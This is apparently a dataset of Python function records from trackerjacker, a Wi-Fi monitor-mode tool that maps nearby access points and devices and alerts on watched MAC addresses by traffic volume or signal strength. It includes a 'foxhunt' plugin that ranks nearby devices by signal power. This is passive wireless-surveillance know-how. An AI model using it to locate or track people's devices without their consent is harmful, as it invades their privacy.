{"name": "trackerjacker.trackerjacker.dot11_frame.Dot11Frame.__init__", "code": "def __init__(self, frame, channel=0, iface=None): self.frame = frame self.bssid = None self.ssid = None self.signal_strength = 0 self.channel = channel self.iface = iface self.frame_bytes = len(frame)  # DS = Distribution System; wired infrastructure connecting multiple BSSs to form an ESS # Needed to determine the meanings of addr1-4 to_ds = frame.FCfield & Dot11Frame.TO_DS != 0 from_ds = frame.FCfield & Dot11Frame.FROM_DS != 0 if to_ds and from_ds: self.dst = frame.addr3 self.src = frame.addr4 self.macs = {frame.addr1, frame.addr2, frame.addr3, frame.addr4} elif to_ds: self.src = frame.addr2 self.dst = frame.addr3 self.bssid = frame.addr1 self.macs = {frame.addr2, frame.addr3} elif from_ds: self.src = frame.addr3 self.dst = frame.addr1 self.bssid = frame.addr2 self.macs = {frame.addr1, frame.addr3} else: self.dst = frame.addr1 self.src = frame.addr2 self.bssid = frame.addr3 self.macs = {frame.addr1, frame.addr2}  if (frame.haslayer(scapy.Dot11Elt) and (frame.haslayer(scapy.Dot11Beacon) or frame.haslayer(scapy.Dot11ProbeResp))):  try: self.ssid = frame[scapy.Dot11Elt].info.decode().replace('\\x00', '[NULL]') except UnicodeDecodeError: # Only seems to happen on macOS - probably some pcap decoding bug self.ssid = None #print('Error decoding ssid: {}'.format(frame[scapy.Dot11Elt].info))  if frame.haslayer(scapy.RadioTap): try: self.signal_strength = frame[scapy.RadioTap].dbm_antsignal except AttributeError: try: self.signal_strength = -(256-ord(frame.notdecoded[-4:-3])) except Exception: self.signal_strength = -257"}
{"name": "trackerjacker.trackerjacker.dot11_frame.Dot11Frame.frame_type", "code": "def frame_type(self): \"\"\"Returns the 802.11 frame type.\"\"\" return self.frame.type"}
{"name": "trackerjacker.trackerjacker.dot11_frame.Dot11Frame.frame_type_name", "code": "def frame_type_name(self): \"\"\"Returns the type of frame - 'management', 'control', 'data', or 'unknown'.\"\"\" if self.frame.type == self.DOT11_FRAME_TYPE_MANAGEMENT: return 'management' elif self.frame.type == self.DOT11_FRAME_TYPE_CONTROL: return 'control' elif self.frame.type == self.DOT11_FRAME_TYPE_DATA: return 'data' return 'unknown'"}
{"name": "trackerjacker.trackerjacker.dot11_frame.Dot11Frame.__str__", "code": "def __str__(self): return 'Dot11 (type={}, from={}, to={}, bssid={}, ssid={}, signal_strength={})'.format( self.frame_type_name(), self.src, self.dst, self.bssid, self.ssid, self.signal_strength)"}
{"name": "trackerjacker.trackerjacker.dot11_frame.Dot11Frame.__repr__", "code": "def __repr__(self): return self.__str__()"}
{"name": "trackerjacker.trackerjacker.__main__.TrackerJacker.__init__", "code": "def __init__(self, logger=None, iface=None, channels_to_monitor=None, channel_switch_scheme='default', time_per_channel=2, display_matching_packets=False, display_all_packets=False, # map args do_map=True, map_file='wifi_map.yaml', map_save_interval=10,  # seconds # track args do_track=False, threshold=None, power=None, devices_to_watch=(), aps_to_watch=(), threshold_window=10, trigger_plugin=None, plugin_config=None, trigger_command=None, trigger_cooldown=30, beep_on_trigger=False):  # seconds  self.iface = iface self.do_map = do_map self.do_track = do_track self.map_file = map_file self.map_save_interval = map_save_interval self.display_matching_packets = display_matching_packets self.display_all_packets = display_all_packets self.mac_vendor_db = ieee_mac_vendor_db.MacVendorDB()  if logger: self.logger = logger else: self.logger = make_logger()  # Even if we are not in map mode, we still need to build the map for tracking purposes self.dot11_map = None if self.do_map: self.map_last_save = time.time()  # Try to load map self.logger.info('Map output file: %s', self.map_file) if os.path.exists(self.map_file): self.dot11_map = dot11_mapper.Dot11Map.load_from_file(self.map_file) else: self.logger.warning('Specified map file not found - creating new map file.')  if not self.dot11_map: self.dot11_map = dot11_mapper.Dot11Map()  self.dot11_map.window = threshold_window  if channel_switch_scheme == 'default': if self.do_map: channel_switch_scheme = 'round_robin' else:  # track mode channel_switch_scheme = 'traffic_based'  self.devices_to_watch_set = set([dev['mac'].lower() for dev in devices_to_watch if 'mac' in dev]) self.aps_to_watch_set = set([ap['bssid'].lower() for ap in aps_to_watch if 'bssid' in ap])  if self.do_track: # Build trigger hit function if trigger_plugin: trigger_plugin = config_management.get_real_plugin_path(trigger_plugin) parsed_trigger_plugin = plugin_parser.parse_trigger_plugin(trigger_plugin, plugin_config) else: parsed_trigger_plugin = None  self.dot11_tracker = dot11_tracker.Dot11Tracker(self.logger, threshold, power, devices_to_watch, aps_to_watch, parsed_trigger_plugin, trigger_command, trigger_cooldown, threshold_window, beep_on_trigger, self.dot11_map)  self.iface_manager = device_management.Dot11InterfaceManager(iface, self.logger, channels_to_monitor, channel_switch_scheme, time_per_channel)"}
{"name": "trackerjacker.trackerjacker.__main__.TrackerJacker.process_packet", "code": "def process_packet(self, pkt): if pkt.haslayer(scapy.Dot11): looking_for_specifics_and_none_found = self.aps_to_watch_set or self.devices_to_watch_set frame = dot11_frame.Dot11Frame(pkt, int(self.iface_manager.current_channel), iface=self.iface_manager.iface) if self.do_map: self.log_newly_found(frame)  if self.display_all_packets: print('\\t', pkt.summary())  # See if any APs we care about (if we're looking for specific APs) if self.aps_to_watch_set: if frame.bssid not in self.aps_to_watch_set: looking_for_specifics_and_none_found = False  # See if any MACs we care about (if we're looking for specific MACs) if self.devices_to_watch_set: matched_macs = self.devices_to_watch_set & frame.macs if matched_macs: looking_for_specifics_and_none_found = False  # Display matched packets (if specified) if self.display_matching_packets and not self.display_all_packets: print('\\t', pkt.summary())  # If we are looking for specific APs or Devices and none are found, no further processing needed if looking_for_specifics_and_none_found: return  # If map mode enabled, do it. Note that we don't exclude non-matching MACs from the mapping # (which is why this isn't under the 'if matched_matcs' block). # Note: we update the map whether do_map is true or false since it's used for tracking; just don't save map self.dot11_map.add_frame(frame) if self.do_map: if time.time() - self.map_last_save >= self.map_save_interval: self.dot11_map.save_to_file(self.map_file) self.map_last_save = time.time()  if self.do_track: self.dot11_tracker.add_frame(frame, pkt)  # Update device tracking (for traffic-based) self.iface_manager.add_frame(frame)"}
{"name": "trackerjacker.trackerjacker.__main__.TrackerJacker.log_newly_found", "code": "def log_newly_found(self, frame): # Log newly-found things if frame.ssid and frame.bssid not in self.dot11_map.access_points.keys(): self.logger.info('SSID found: %s, BSSID: %s, Channel: %d', frame.ssid, frame.bssid, frame.channel)  new_macs = [mac for mac in frame.macs if mac not in (self.dot11_map.devices.keys() | self.dot11_map.access_points.keys() | dot11_mapper.MACS_TO_IGNORE)] for mac in new_macs: if mac:  # The frame can be crafted to include a null mac self.logger.info('MAC found: %s, Channel: %d', mac, frame.channel)"}
{"name": "trackerjacker.trackerjacker.__main__.TrackerJacker.start", "code": "def start(self): self.logger.debug('Starting monitoring on %s', self.iface_manager.iface) self.iface_manager.start() while True: try: # macOS if platform.system() == 'Darwin': self.logger.warning('trackerjacker macOS support is pre-alpha - most functionality is linux-only') scapy.sniff(iface=self.iface_manager.iface, monitor=True, prn=self.process_packet, store=0) break # linux else: # For versions of scapy that don't provide the exceptions kwarg scapy.sniff(iface=self.iface_manager.iface, prn=self.process_packet, store=0) break  except TJException: raise except (OSError, IOError): self.logger.error(traceback.format_exc()) self.logger.info('Sniffer error occurred. Restarting sniffer in 3 seconds...') time.sleep(3)"}
{"name": "trackerjacker.trackerjacker.__main__.TrackerJacker.stop", "code": "def stop(self): self.iface_manager.stop()  if self.do_map: # Flush map to disk self.dot11_map.save_to_file(self.map_file)"}
{"name": "trackerjacker.trackerjacker.macos_device_management.MonitorModeHack.__init__", "code": "def __init__(self, iface): self.iface = iface self.sniff_time = 10 * 60  # 10 minutes self.stop_event = threading.Event() self.proc = None self.starting_tmp_pcaps = self.find_new_pcap([])"}
{"name": "trackerjacker.trackerjacker.macos_device_management.MonitorModeHack.sniff_for", "code": "def sniff_for(self, for_time=None): self.proc = subprocess.Popen([AIRPORT_PATH, self.iface, 'sniff', '1'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) if for_time: time.sleep(for_time) self.proc.terminate()"}
{"name": "trackerjacker.trackerjacker.macos_device_management.MonitorModeHack.find_new_pcap", "code": "def find_new_pcap(self, previous_pcap_paths): tmp_files = os.listdir('/tmp/') pcap_files = [f for f in tmp_files if f.endswith('.cap')] new_pcap = set(pcap_files) - set(previous_pcap_paths) return list(new_pcap)"}
{"name": "trackerjacker.trackerjacker.macos_device_management.MonitorModeHack.sniff_loop", "code": "def sniff_loop(self): while not self.stop_event.is_set(): self.starting_tmp_pcaps = self.find_new_pcap([])  self.sniff_for(self.sniff_time)  # Delete pcap file we created self.delete_pcaps_we_created()"}
{"name": "trackerjacker.trackerjacker.macos_device_management.MonitorModeHack.delete_pcaps_we_created", "code": "def delete_pcaps_we_created(self): pcaps_we_created = self.find_new_pcap(self.starting_tmp_pcaps) for pcap_filename in pcaps_we_created: tmp_pcap = os.path.join('/tmp/', pcap_filename) try: os.remove(tmp_pcap) except Exception as e: print('Error removing pcap ({}): {}'.format(tmp_pcap, e))"}
{"name": "trackerjacker.trackerjacker.macos_device_management.MonitorModeHack.start", "code": "def start(self): t = threading.Thread(target=self.sniff_loop, args=()) t.daemon = True t.start()"}
{"name": "trackerjacker.trackerjacker.macos_device_management.MonitorModeHack.stop", "code": "def stop(self): self.stop_event.set() if self.proc: self.proc.terminate() time.sleep(2) self.delete_pcaps_we_created()"}
{"name": "trackerjacker.trackerjacker.macos_device_management.Dot11InterfaceManager.__init__", "code": "def __init__(self, iface, logger, channels_to_monitor, channel_switch_scheme, time_per_channel): self.logger = logger self.iface, self.need_to_disable_monitor_mode_on_exit = select_interface(iface, self.logger)  self.channels_to_monitor = channels_to_monitor self.channel_switch_scheme = channel_switch_scheme self.time_per_channel = time_per_channel  self.stop_event = threading.Event() self.supported_channels = [] self.current_channel = 1 self.last_channel_switch_time = 0 self.num_frames_received_this_channel = 0  self.channel_switch_func = self.switch_channel_round_robin  # default self.configure_channels(channels_to_monitor, channel_switch_scheme) self.horrible_hack = None  # Leaky bucket per channel to track how many frames were seen last time that channels was monitored # The leaky bucket helps ensure that if at one time, someone downloads a video or something, # that channel doesn't forever get dominance. counter_leaky_bucket_size = 10 self.frame_counts_per_channel = {c: collections.deque([(time.time(), MIN_FRAME_COUNT)], maxlen=counter_leaky_bucket_size) for c in self.channels_to_monitor}"}
{"name": "trackerjacker.trackerjacker.macos_device_management.Dot11InterfaceManager.configure_channels", "code": "def configure_channels(self, channels_to_monitor, channel_switch_scheme): # Find supported channels self.supported_channels = get_supported_channels(self.iface) if not self.supported_channels: raise TJException('Interface either not found, or incompatible: {}'.format(self.iface))  if channels_to_monitor: channels_to_monitor_set = set([int(c) for c in channels_to_monitor]) if len(channels_to_monitor_set & set(self.supported_channels)) != len(channels_to_monitor_set): raise TJException('Not all of channels to monitor are supported by {}'.format(self.iface))  self.channels_to_monitor = channels_to_monitor self.current_channel = self.channels_to_monitor[0] self.logger.info('Monitoring channels: %s', channels_to_monitor_set) else: self.channels_to_monitor = self.supported_channels self.current_channel = self.supported_channels[0] self.logger.info('Monitoring all available channels on %s: %s', self.iface, self.supported_channels)  self.logger.debug('Channel switching scheme: %s', channel_switch_scheme)  if channel_switch_scheme == 'traffic_based': self.channel_switch_func = self.switch_channel_based_on_traffic  self.switch_to_channel(self.current_channel, force=True)"}
{"name": "trackerjacker.trackerjacker.macos_device_management.Dot11InterfaceManager.channel_switcher_thread", "code": "def channel_switcher_thread(self, firethread=True):  # pylint: disable=R1710 if firethread: t = threading.Thread(target=self.channel_switcher_thread, args=(False,)) t.daemon = True t.start() return t  # Only worry about switching channels if we are monitoring 2 or more if len(self.channels_to_monitor) > 1: while not self.stop_event.is_set(): time.sleep(self.time_per_channel) self.channel_switch_func() self.last_channel_switch_time = time.time()"}
{"name": "trackerjacker.trackerjacker.macos_device_management.Dot11InterfaceManager.get_next_channel_based_on_traffic", "code": "def get_next_channel_based_on_traffic(self): count_by_channel = {c: sum([count for ts, count in frame_count_list]) for c, frame_count_list in self.frame_counts_per_channel.items()} total_count = sum(count_by_channel.values()) percent_to_channel = [(count/total_count, channel) for channel, count in count_by_channel.items()]  percent_sum = 0 sum_to_reach = random.random() for percent, channel in percent_to_channel: percent_sum += percent if percent_sum >= sum_to_reach: return channel  return random.sample(self.channels_to_monitor, 1)[0]"}
{"name": "trackerjacker.trackerjacker.macos_device_management.Dot11InterfaceManager.switch_channel_based_on_traffic", "code": "def switch_channel_based_on_traffic(self): next_channel = self.get_next_channel_based_on_traffic()  # Don't ever set a channel to a 0% probability of being hit again if self.num_frames_received_this_channel == 0: self.num_frames_received_this_channel = MIN_FRAME_COUNT  time_frames_entry = (time.time(), self.num_frames_received_this_channel) self.frame_counts_per_channel[self.current_channel].append(time_frames_entry) self.num_frames_received_this_channel = 0 self.switch_to_channel(next_channel)"}
{"name": "trackerjacker.trackerjacker.macos_device_management.Dot11InterfaceManager.switch_channel_round_robin", "code": "def switch_channel_round_robin(self): chans = self.channels_to_monitor next_channel = chans[(chans.index(self.current_channel)+1) % len(chans)] self.switch_to_channel(next_channel)"}
{"name": "trackerjacker.trackerjacker.macos_device_management.Dot11InterfaceManager.switch_to_channel", "code": "def switch_to_channel(self, channel_num, force=False): self.logger.debug('Switching to channel %s', channel_num) if channel_num == self.current_channel and not force: return switch_to_channel(self.iface, channel_num) self.current_channel = channel_num"}
{"name": "trackerjacker.trackerjacker.macos_device_management.Dot11InterfaceManager.add_frame", "code": "def add_frame(self, frame): self.num_frames_received_this_channel += 1"}
{"name": "trackerjacker.trackerjacker.macos_device_management.Dot11InterfaceManager.start", "code": "def start(self): self.do_horrible_monitor_mode_hack() self.channel_switcher_thread() # Need to switch to channel after starting the monitor_mode_hack time.sleep(1) self.switch_to_channel(self.current_channel, force=True)"}
{"name": "trackerjacker.trackerjacker.macos_device_management.Dot11InterfaceManager.stop", "code": "def stop(self): self.stop_event.set()  if self.need_to_disable_monitor_mode_on_exit: self.logger.info('\\nDisabling monitor mode for interface: %s', self.iface)  # Try to wait long enough for the channel switching thread to see the event so # the device isn't busy when we try to disable monitor mode. time.sleep(self.time_per_channel + 1)  #monitor_mode_off(self.iface) if self.horrible_hack: self.horrible_hack.stop() self.logger.debug('Disabled monitor mode for interface: %s', self.iface)"}
{"name": "trackerjacker.trackerjacker.macos_device_management.Dot11InterfaceManager.do_horrible_monitor_mode_hack", "code": "def do_horrible_monitor_mode_hack(self): self.horrible_hack = MonitorModeHack(self.iface) self.horrible_hack.start()"}
{"name": "trackerjacker.trackerjacker.dot11_tracker.Dot11Tracker.__init__", "code": "def __init__(self, logger, threshold, power, devices_to_watch, aps_to_watch, trigger_plugin, trigger_command, trigger_cooldown, threshold_window, beep_on_trigger, dot11_map):  self.stop_event = threading.Event() self.last_alerted = {}  # Same as self.arg = arg for every arg (except devices_to_watch and aps_to_watch) self.__dict__.update({k: v for k, v in locals().items() if k != 'aps_to_watch'})  # If no particular things are specified to be watched, assume everything should be watched self.track_all = (not aps_to_watch and not devices_to_watch)  # Creates a map like: {'my_ssid1': {'threshold': 5000, 'last_alert': timestamp}, 'bssid2': {...} } self.bssids_to_watch = {} self.ssids_to_watch = {} for ap_identifier, watch_entry in aps_to_watch.items(): # Try to determine if the ap_identifier is a bssid or ssid based on pattern, and behave accordingly # Note that this means ssids that are named like a bssid will be treated like a bssid instead of an # essid, but that's a trade off in terms of simplicity of use I'm willing to make right now. if re.match(r'^([a-fA-F0-9]{2}[:|\\-]?){6}$', ap_identifier): self.bssids_to_watch[ap_identifier.lower()] = watch_entry else: self.ssids_to_watch[ap_identifier] = watch_entry"}
{"name": "trackerjacker.trackerjacker.dot11_tracker.Dot11Tracker.add_frame", "code": "def add_frame(self, frame, raw_frame): if self.track_all: self.eval_general_mac_trigger(frame.macs, frame, raw_frame) self.eval_general_bssid_trigger(frame.bssid, frame, raw_frame) self.eval_general_ssid_trigger(frame.ssid, frame, raw_frame) else: self.eval_mac_triggers(frame.macs, frame, raw_frame) self.eval_bssid_triggers(frame.bssid, frame, raw_frame) self.eval_ssid_triggers(frame.ssid, frame, raw_frame)"}
{"name": "trackerjacker.trackerjacker.dot11_tracker.Dot11Tracker.eval_general_mac_trigger", "code": "def eval_general_mac_trigger(self, macs, frame, raw_frame): for mac in macs: dev_node = self.dot11_map.get_dev_node(mac) if not dev_node: continue  if self.threshold: # Calculate bytes received in the alert_window bytes_in_window = (self.get_bytes_in_window(dev_node['frames_in']) + self.get_bytes_in_window(dev_node['frames_out'])) if bytes_in_window >= self.threshold: self.do_trigger_alert(mac, 'mac', num_bytes=bytes_in_window, data_threshold=self.threshold, vendor=dev_node['vendor'], frame=frame, raw_frame=raw_frame)  if self.power and frame.signal_strength > self.power: self.do_trigger_alert(mac, 'mac', vendor=dev_node['vendor'], power_threshold=self.power, frame=frame, raw_frame=raw_frame)"}
{"name": "trackerjacker.trackerjacker.dot11_tracker.Dot11Tracker.eval_general_bssid_trigger", "code": "def eval_general_bssid_trigger(self, bssid, frame, raw_frame): bssid_node = self.dot11_map.get_ap_by_bssid(bssid) if self.threshold and bssid_node and 'frames' in bssid_node: bytes_in_window = self.get_bytes_in_window(bssid_node['frames']) if bytes_in_window >= self.threshold: vendor = None if bssid_node: vendor = bssid_node['vendor'] self.do_trigger_alert(bssid, 'bssid', num_bytes=bytes_in_window, data_threshold=self.threshold, vendor=vendor, frame=frame, raw_frame=raw_frame)  if self.power and frame.signal_strength >= self.power: vendor = None if bssid_node: vendor = bssid_node['vendor'] self.do_trigger_alert(bssid, 'bssid', power_threshold=self.power, vendor=vendor, frame=frame, raw_frame=raw_frame)"}
{"name": "trackerjacker.trackerjacker.dot11_tracker.Dot11Tracker.eval_general_ssid_trigger", "code": "def eval_general_ssid_trigger(self, ssid, frame, raw_frame): bssid_nodes = self.dot11_map.get_ap_nodes_by_ssid(ssid) if bssid_nodes: if self.threshold: bytes_in_window = reduce(lambda acc, bssid_bytes: acc+bssid_bytes, [self.get_bytes_in_window(bssid_node['frames']) for bssid_node in bssid_nodes], 0) if bytes_in_window >= self.threshold: self.do_trigger_alert(ssid, 'ssid', num_bytes=bytes_in_window, data_threshold=self.threshold, frame=frame, raw_frame=raw_frame)  if self.power and frame.signal_strength >= self.power: self.do_trigger_alert(ssid, 'ssid', power_threshold=self.power, frame=frame, raw_frame=raw_frame)"}
{"name": "trackerjacker.trackerjacker.dot11_tracker.Dot11Tracker.eval_mac_triggers", "code": "def eval_mac_triggers(self, macs, frame, raw_frame): # Only eval macs both on the \"to watch\" list and in the frame devices_to_eval = macs & self.devices_to_watch.keys() for mac in devices_to_eval: if mac in MACS_TO_IGNORE: continue dev_watch_node = self.devices_to_watch[mac] dev_node = self.dot11_map.get_dev_node(mac) bytes_in_window = 0 triggered = False  if dev_node: if dev_watch_node['threshold']: # Calculate bytes received in the alert_window bytes_in_window = (self.get_bytes_in_window(dev_node['frames_in']) + self.get_bytes_in_window(dev_node['frames_out'])) if bytes_in_window >= dev_watch_node['threshold']: self.do_trigger_alert(mac, 'mac', num_bytes=bytes_in_window, data_threshold=dev_watch_node['threshold'], vendor=dev_node['vendor'], frame=frame, raw_frame=raw_frame) triggered = True  if dev_watch_node['power'] and frame.signal_strength > dev_watch_node['power']: self.do_trigger_alert(mac, 'mac', vendor=dev_node['vendor'], power_threshold=dev_watch_node['power'], frame=frame, raw_frame=raw_frame) triggered = True  if not triggered: self.logger.debug('Bytes received for {} (threshold: {}) in last {} seconds: {}' .format(mac, dev_watch_node['threshold'], self.threshold_window, bytes_in_window))"}
{"name": "trackerjacker.trackerjacker.dot11_tracker.Dot11Tracker.eval_bssid_triggers", "code": "def eval_bssid_triggers(self, bssid, frame, raw_frame): if (bssid not in self.bssids_to_watch) or (bssid in MACS_TO_IGNORE): return  bssid_watch_node = self.bssids_to_watch[bssid] bssid_node = self.dot11_map.get_ap_by_bssid(bssid) bytes_in_window = 0 triggered = False  if bssid_node: bytes_in_window = self.get_bytes_in_window(bssid_node['frames']) if bssid_watch_node['threshold'] and bytes_in_window >= bssid_watch_node['threshold']: self.do_trigger_alert(bssid, 'bssid', num_bytes=bytes_in_window, data_threshold=bssid_watch_node['threshold'], vendor=bssid_node['vendor'], frame=frame, raw_frame=raw_frame) triggered = True  if bssid_watch_node['power'] and frame.signal_strength >= bssid_watch_node['power']: self.do_trigger_alert(bssid, 'bssid', vendor=bssid_node['vendor'], power_threshold=bssid_watch_node['power'], frame=frame, raw_frame=raw_frame) triggered = True  if not triggered: self.logger.info('Bytes received for {} in last {} seconds: {}' .format(bssid, self.threshold_window, bytes_in_window))"}
{"name": "trackerjacker.trackerjacker.dot11_tracker.Dot11Tracker.eval_ssid_triggers", "code": "def eval_ssid_triggers(self, ssid, frame, raw_frame): if ssid not in self.ssids_to_watch: return  ssid_watch_node = self.ssids_to_watch[ssid] bssid_nodes = self.dot11_map.get_ap_nodes_by_ssid(ssid) bytes_in_window = 0  if bssid_nodes: bytes_in_window = reduce(lambda acc, bssid_bytes: acc+bssid_bytes, [self.get_bytes_in_window(bssid_node['frames']) for bssid_node in bssid_nodes], 0) if bytes_in_window >= ssid_watch_node['threshold']: self.do_trigger_alert(ssid, 'ssid', num_bytes=bytes_in_window, data_threshold=ssid_watch_node['threshold'], frame=frame, raw_frame=raw_frame) return  self.logger.info('Bytes received for {} in last {} seconds: {}' .format(ssid, self.threshold_window, bytes_in_window))"}
{"name": "trackerjacker.trackerjacker.dot11_tracker.Dot11Tracker.do_trigger_alert", "code": "def do_trigger_alert(self, dev_id, dev_type, num_bytes=None, data_threshold=None, power_threshold=None, vendor=None, frame=None, raw_frame=None): \"\"\"Do alert for triggered item.  Args: alert_msg: Message to log for the alert \"\"\" if time.time() - self.last_alerted.get(dev_id, 9999999) < self.trigger_cooldown: self.logger.debug('[*] Saw {}, but still in cooldown period ({} seconds)' .format(dev_id, self.trigger_cooldown)) return  if self.beep_on_trigger: print(chr(0x07))  if self.trigger_plugin: try: self.trigger_plugin['trigger'](dev_id=dev_id, dev_type=dev_type, num_bytes=num_bytes, data_threshold=data_threshold, vendor=vendor, power=frame.signal_strength, power_threshold=power_threshold, bssid=frame.bssid, ssid=frame.ssid, iface=frame.iface, channel=frame.channel, frame_type=frame.frame_type_name(), frame=raw_frame) except Exception: raise TJException('Error occurred in trigger plugin: {}'.format(traceback.format_exc()))  elif self.trigger_command: try: # Start trigger_command in background process - fire and forget subprocess.Popen(self.trigger_command) except Exception: raise TJException('Error occurred in trigger command: {}'.format(traceback.format_exc()))  else: if num_bytes: alert_msg = '[@] Device ({} {}) data threshold ({}) hit: {} bytes'.format(dev_type, dev_id, data_threshold, num_bytes) else: alert_msg = '[@] Device ({} {}) power threshold ({}) hit: {}dBm'.format(dev_type, dev_id, power_threshold, frame.signal_strength) self.logger.info(alert_msg)  self.last_alerted[dev_id] = time.time()"}
{"name": "trackerjacker.trackerjacker.dot11_tracker.Dot11Tracker.get_bytes_in_window", "code": "def get_bytes_in_window(self, frame_list): \"\"\"Returns number of bytes in a frame_list.  Args: frame_list: List in format - [(ts1, num_bytes1), (ts2, num_bytes2)] \"\"\" bytes_in_window = 0 now = time.time() for ts, num_bytes in frame_list: if (now - ts) > self.threshold_window: break bytes_in_window += num_bytes return bytes_in_window"}
{"name": "trackerjacker.trackerjacker.plugins.foxhunt.Trigger.__init__", "code": "def __init__(self): self.dev_to_power = {} self.dev_to_vendor = {} self.dev_to_last_seen = {} self.frame_count = 0  # Pronounce a curse self.stdscr = curses.initscr() curses.noecho() curses.cbreak() self.num_to_show = 30  # Default until we get number of lines"}
{"name": "trackerjacker.trackerjacker.plugins.foxhunt.Trigger.__call__", "code": "def __call__(self, dev_id=None, dev_type=None, power=None, vendor=None, **kwargs): # Only look at individual devices (device and bssids), and only look when power is present if (not power) or (not dev_id) or (dev_type == 'ssid') or (dev_id in DEVS_TO_IGNORE): return  self.frame_count += 1 self.dev_to_power[dev_id] = power self.dev_to_vendor[dev_id] = vendor self.dev_to_last_seen[dev_id] = time.time() self.decay_items() self.show_top_devices()"}
{"name": "trackerjacker.trackerjacker.plugins.foxhunt.Trigger.show_top_devices", "code": "def show_top_devices(self): top_devices = [] num_lines = self.stdscr.getmaxyx()[0] num_devices_to_show = num_lines - 2  # 2 lines for header for _, dev_id in heapq.nlargest(num_devices_to_show, [(power, mac) for mac, power in self.dev_to_power.items()]): top_devices.append({'dev_id': dev_id, 'power': self.dev_to_power[dev_id], 'vendor': self.dev_to_vendor[dev_id]}) try: self.show_list(top_devices) except Exception as e: # Ignore any screen drawing exceptions with open('debug.txt', 'a') as f: f.write('Error in foxhunt: {}'.format(e))"}
{"name": "trackerjacker.trackerjacker.plugins.foxhunt.Trigger.show_list", "code": "def show_list(self, top_devices): self.stdscr.erase() header = '{:>7}        {:<17}        {}'.format('POWER', 'DEVICE ID', 'VENDOR') lines = '=' * 7 + ' ' * 8 + '=' * 17 + ' ' * 8 + '=' * 32 self.stdscr.addstr(0, 0, header) self.stdscr.addstr(1, 0, lines) for index, device in enumerate(top_devices): msg = '{:>4}dBm        {:<17}        '.format(device['power'], device['dev_id']) if device['vendor']: msg += '{}'.format(device['vendor']) self.stdscr.addstr(index + 2, 0, msg) self.stdscr.refresh()"}
{"name": "trackerjacker.trackerjacker.plugins.foxhunt.Trigger.decay_items", "code": "def decay_items(self): # Only decay ever 100 frames (for efficiency) and don't bother removing items if we are under the limit if self.frame_count % 100 != 0 or len(self.dev_to_power) <= self.num_to_show: return  # Don't bother removing items if we are under the limit  num_items_to_remove = len(self.dev_to_power) - self.num_to_show for _, dev_id in heapq.nsmallest(num_items_to_remove, [(last_seen, mac) for mac, last_seen in self.dev_to_last_seen.items()]): self.dev_to_last_seen.pop(dev_id) self.dev_to_vendor.pop(dev_id) self.dev_to_power.pop(dev_id)"}
{"name": "trackerjacker.trackerjacker.plugins.foxhunt.Trigger.__del__", "code": "def __del__(self): curses.echo() curses.nocbreak() curses.endwin()"}
{"name": "trackerjacker.trackerjacker.linux_device_management.Dot11InterfaceManager.__init__", "code": "def __init__(self, iface, logger, channels_to_monitor, channel_switch_scheme, time_per_channel): self.logger = logger self.iface, self.need_to_disable_monitor_mode_on_exit = select_interface(iface, self.logger)  self.channels_to_monitor = channels_to_monitor self.channel_switch_scheme = channel_switch_scheme self.time_per_channel = time_per_channel  self.stop_event = threading.Event() self.supported_channels = [] self.current_channel = 1 self.last_channel_switch_time = 0 self.num_frames_received_this_channel = 0  self.channel_switch_func = self.switch_channel_round_robin  # default self.configure_channels(channels_to_monitor, channel_switch_scheme)  # Leaky bucket per channel to track how many frames were seen last time that channels was monitored # The leaky bucket helps ensure that if at one time, someone downloads a video or something, # that channel doesn't forever get dominance. counter_leaky_bucket_size = 10 self.frame_counts_per_channel = {c: collections.deque([(time.time(), MIN_FRAME_COUNT)], maxlen=counter_leaky_bucket_size) for c in self.channels_to_monitor}"}
{"name": "trackerjacker.trackerjacker.linux_device_management.Dot11InterfaceManager.configure_channels", "code": "def configure_channels(self, channels_to_monitor, channel_switch_scheme): # Find supported channels self.supported_channels = get_supported_channels(self.iface) if not self.supported_channels: raise TJException('Interface either not found, or incompatible: {}'.format(self.iface))  if channels_to_monitor: channels_to_monitor_set = set([int(c) for c in channels_to_monitor]) if len(channels_to_monitor_set & set(self.supported_channels)) != len(channels_to_monitor_set): raise TJException('Not all of channels to monitor are supported by {}'.format(self.iface))  self.channels_to_monitor = channels_to_monitor self.current_channel = self.channels_to_monitor[0] self.logger.info('Monitoring channels: %s', channels_to_monitor_set) else: self.channels_to_monitor = self.supported_channels self.current_channel = self.supported_channels[0] self.logger.info('Monitoring all available channels on %s: %s', self.iface, self.supported_channels)  self.logger.debug('Channel switching scheme: %s', channel_switch_scheme)  if channel_switch_scheme == 'traffic_based': self.channel_switch_func = self.switch_channel_based_on_traffic  self.switch_to_channel(self.current_channel, force=True)"}
{"name": "trackerjacker.trackerjacker.linux_device_management.Dot11InterfaceManager.channel_switcher_thread", "code": "def channel_switcher_thread(self, firethread=True):  # pylint: disable=R1710 if firethread: t = threading.Thread(target=self.channel_switcher_thread, args=(False,)) t.daemon = True t.start() return t  # Only worry about switching channels if we are monitoring 2 or more if len(self.channels_to_monitor) > 1: while not self.stop_event.is_set(): time.sleep(self.time_per_channel) self.channel_switch_func() self.last_channel_switch_time = time.time()"}
{"name": "trackerjacker.trackerjacker.linux_device_management.Dot11InterfaceManager.get_next_channel_based_on_traffic", "code": "def get_next_channel_based_on_traffic(self): count_by_channel = {c: sum([count for ts, count in frame_count_list]) for c, frame_count_list in self.frame_counts_per_channel.items()} total_count = sum(count_by_channel.values()) percent_to_channel = [(count/total_count, channel) for channel, count in count_by_channel.items()]  percent_sum = 0 sum_to_reach = random.random() for percent, channel in percent_to_channel: percent_sum += percent if percent_sum >= sum_to_reach: return channel  return random.sample(self.channels_to_monitor, 1)[0]"}
{"name": "trackerjacker.trackerjacker.linux_device_management.Dot11InterfaceManager.switch_channel_based_on_traffic", "code": "def switch_channel_based_on_traffic(self): next_channel = self.get_next_channel_based_on_traffic()  # Don't ever set a channel to a 0% probability of being hit again if self.num_frames_received_this_channel == 0: self.num_frames_received_this_channel = MIN_FRAME_COUNT  time_frames_entry = (time.time(), self.num_frames_received_this_channel) self.frame_counts_per_channel[self.current_channel].append(time_frames_entry) self.num_frames_received_this_channel = 0 self.switch_to_channel(next_channel)"}
{"name": "trackerjacker.trackerjacker.linux_device_management.Dot11InterfaceManager.switch_channel_round_robin", "code": "def switch_channel_round_robin(self): chans = self.channels_to_monitor next_channel = chans[(chans.index(self.current_channel)+1) % len(chans)] self.switch_to_channel(next_channel)"}
